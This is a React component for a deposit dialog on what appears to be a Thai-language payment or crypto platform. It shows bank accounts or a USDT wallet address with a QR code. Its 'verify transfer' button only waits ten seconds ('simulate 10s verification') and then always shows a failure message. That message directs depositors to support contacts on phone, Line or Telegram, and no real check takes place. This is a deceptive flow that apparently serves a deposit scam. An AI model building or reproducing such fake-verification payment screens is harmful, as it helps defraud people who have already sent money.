import React, { useState, useEffect } from "react";
import { motion, AnimatePresence } from "framer-motion";
import {
  X,
  ArrowDownCircle,
  ChevronRight,
  CheckCircle2,
  Copy,
  AlertCircle,
  Loader2,
} from "lucide-react";
import { supabase } from "../../lib/supabase";
import { depositMethods } from "../../data/depositMethods";
import qrImage from "../../assets/qr_placeholder.png";
import { SupportContactList } from "./SupportContactList";

type DepositStep = "select" | "qr" | "submitted";

interface DepositModalProps {
  onClose: () => void;
}

export const DepositModal: React.FC<DepositModalProps> = ({ onClose }) => {
  const [step, setStep] = useState<DepositStep>("select");
  const [selected, setSelected] = useState<(typeof depositMethods)[0] | null>(
    null,
  );
  const [amount, setAmount] = useState("");
  const [copied, setCopied] = useState(false);
  const [submitting, setSubmitting] = useState(false);
  const [settings, setSettings] = useState({
    phone: "",
    line: "",
    telegram: "",
  });

  useEffect(() => {
    const fetchSettings = async () => {
      const { data } = await supabase
        .from("global_settings")
        .select("*")
        .eq("id", "main")
        .single();
      if (data) {
        setSettings({
          phone: data.contact_phone || "",
          line: data.contact_line || "",
          telegram: data.contact_telegram || "",
        });
      }
    };
    fetchSettings();
  }, []);

  const copyAddress = () => {
    if (!selected) return;
    navigator.clipboard.writeText(selected.account);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const handleSubmit = async () => {
    setSubmitting(true);
    await new Promise((r) => setTimeout(r, 10000)); // simulate 10s verification
    setSubmitting(false);
    setStep("submitted");
  };

  const qrUrl = selected
    ? `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(selected.qrData)}&bgcolor=0f172a&color=818cf8&margin=10`
    : "";

  return (
    <AnimatePresence mode="wait">
      {/* ── Step 1: select currency ── */}
      {step === "select" && (
        <motion.div
          key="select"
          initial={{ opacity: 0, x: 30 }}
          animate={{ opacity: 1, x: 0 }}
          exit={{ opacity: 0, x: -30 }}
          className="max-h-[80vh] overflow-y-auto custom-scrollbar"
        >
          <div className="flex items-center justify-between mb-6">
            <div>
              <h2 className="text-xl font-black text-white flex items-center gap-2">
                <ArrowDownCircle size={22} className="text-green-500" />
                ฝากเงิน / Deposit
              </h2>
              <p className="text-slate-400 text-xs mt-0.5">
                เลือกสกุลเงินที่ต้องการฝาก
              </p>
            </div>
            <button
              onClick={onClose}
              className="w-8 h-8 rounded-full bg-white/5 hover:bg-white/10 flex items-center justify-center text-slate-400 hover:text-white transition-colors"
            >
              <X size={16} />
            </button>
          </div>

          <div className="space-y-3">
            {depositMethods.map((m) => (
              <button
                key={m.id}
                onClick={() => {
                  setSelected(m);
                  setStep("qr");
                }}
                className={`w-full flex items-center justify-between p-4 rounded-2xl bg-gradient-to-tr ${m.color} border ${m.border} hover:border-white/30 transition-all group`}
              >
                <div className="flex items-center gap-3">
                  <span className="text-2xl">{m.flag}</span>
                  <div className="text-left">
                    <p className="text-white font-bold text-sm">{m.label}</p>
                    <p className="text-slate-400 text-xs">{m.bank}</p>
                  </div>
                </div>
                <ChevronRight
                  size={16}
                  className="text-slate-500 group-hover:text-white group-hover:translate-x-1 transition-all"
                />
              </button>
            ))}
          </div>
        </motion.div>
      )}

      {/* ── Step 2: QR + account ── */}
      {step === "qr" && selected && (
        <motion.div
          key="qr"
          initial={{ opacity: 0, x: 30 }}
          animate={{ opacity: 1, x: 0 }}
          exit={{ opacity: 0, x: -30 }}
          className="max-h-[80vh] overflow-y-auto custom-scrollbar"
        >
          <div className="flex items-center justify-between mb-5">
            <button
              onClick={() => setStep("select")}
              className="text-slate-400 hover:text-white text-sm font-bold flex items-center gap-1"
            >
              <ChevronRight size={14} className="rotate-180" /> Back
            </button>
            <button
              onClick={onClose}
              className="w-8 h-8 rounded-full bg-white/5 hover:bg-white/10 flex items-center justify-center text-slate-400 hover:text-white transition-colors"
            >
              <X size={16} />
            </button>
          </div>

          <div className="text-center mb-5">
            <span className="text-3xl">{selected.flag}</span>
            <h2 className="text-lg font-black text-white mt-1">
              {selected.label}
            </h2>
            <p className="text-slate-400 text-xs">{selected.bank}</p>
          </div>

          {/* QR Code */}
          <div className="flex justify-center mb-5">
            <div className="w-48 h-48 bg-slate-900 rounded-2xl border border-white/10 overflow-hidden flex items-center justify-center p-2">
              <img
                src={qrUrl}
                alt="QR Code"
                className="w-full h-full object-contain rounded-xl"
                onError={(e) => {
                  (e.target as HTMLImageElement).src = qrImage;
                }}
              />
            </div>
          </div>

          {/* Account / Address */}
          <div className="bg-white/5 rounded-xl p-3 mb-4">
            <p className="text-slate-500 text-[10px] uppercase tracking-widest mb-1">
              {selected.id === "usdt" ? "Wallet Address" : "Account Number"}
            </p>
            <div className="flex items-center justify-between gap-2">
              <p className="text-white font-mono text-sm break-all">
                {selected.account}
              </p>
              <button
                onClick={copyAddress}
                className={`shrink-0 flex items-center gap-1 text-xs font-bold px-3 py-1.5 rounded-lg transition-all ${copied ? "bg-green-500/20 text-green-400" : "bg-white/10 text-slate-400 hover:text-white"}`}
              >
                {copied ? <CheckCircle2 size={12} /> : <Copy size={12} />}
                {copied ? "Copied!" : "Copy"}
              </button>
            </div>
            {selected.address && (
              <p className="text-slate-500 text-[10px] mt-1">
                SWIFT/Network: {selected.address}
              </p>
            )}
          </div>

          {/* Amount */}
          <div className="space-y-2 mb-4">
            <label className="text-xs font-black text-slate-400 uppercase tracking-widest">
              จำนวนที่โอน / Amount
            </label>
            <div className="relative">
              <input
                type="number"
                value={amount}
                onChange={(e) => setAmount(e.target.value)}
                placeholder="0.00"
                className="w-full bg-slate-900 border border-white/10 rounded-xl py-3 px-4 text-white font-bold focus:outline-none focus:ring-2 focus:ring-primary/40 transition-all placeholder:text-slate-700"
              />
            </div>
          </div>

          <div className="text-xs text-amber-400/80 bg-amber-500/10 border border-amber-500/20 rounded-lg p-3 mb-4">
            ⚠️ โอนเงินแล้วกด "แจ้งโอนเงิน"
            เพื่อให้ทีมงานตรวจสอบและเติมยอดเข้าบัญชี
          </div>

          <button
            onClick={handleSubmit}
            disabled={!amount || submitting}
            className="w-full py-4 rounded-xl bg-green-500 hover:bg-green-600 text-white font-black text-base shadow-2xl shadow-green-500/30 transition-all active:scale-95 disabled:opacity-50 flex items-center justify-center gap-2"
          >
            {submitting ? (
              <Loader2 size={20} className="animate-spin" />
            ) : (
              <ArrowDownCircle size={20} />
            )}
            {submitting ? "กำลังส่งคำขอ..." : "แจ้งโอนเงิน"}
          </button>
        </motion.div>
      )}

      {/* ── Step 3: Error + contacts ── */}
      {step === "submitted" && (
        <motion.div
          key="submitted"
          initial={{ opacity: 0, scale: 0.95 }}
          animate={{ opacity: 1, scale: 1 }}
          exit={{ opacity: 0 }}
        >
          <div className="flex justify-end mb-2">
            <button
              onClick={onClose}
              className="w-8 h-8 rounded-full bg-white/5 hover:bg-white/10 flex items-center justify-center text-slate-400 hover:text-white transition-colors"
            >
              <X size={16} />
            </button>
          </div>

          {/* Error notice */}
          <div className="flex flex-col items-center text-center mb-6">
            <div className="w-16 h-16 rounded-full bg-red-500/20 border border-red-500/30 flex items-center justify-center mb-4">
              <AlertCircle size={32} className="text-red-400" />
            </div>
            <h2 className="text-xl font-black text-white mb-1">
              ไม่สามารถยืนยันการโอนได้
            </h2>
            <p className="text-slate-400 text-sm leading-relaxed">
              ระบบไม่สามารถตรวจสอบการโอนเงินของคุณได้อัตโนมัติ
              <br />
              กรุณาติดต่อทีมสนับสนุนเพื่อยืนยันและเติมยอดเข้าบัญชี
            </p>
          </div>

          {/* Contact list */}
          <div className="mb-6">
            <SupportContactList settings={settings} />
          </div>

          <button
            onClick={onClose}
            className="w-full py-3 rounded-xl bg-white/10 hover:bg-white/15 text-white font-bold transition-all"
          >
            ปิด
          </button>
        </motion.div>
      )}
    </AnimatePresence>
  );
};
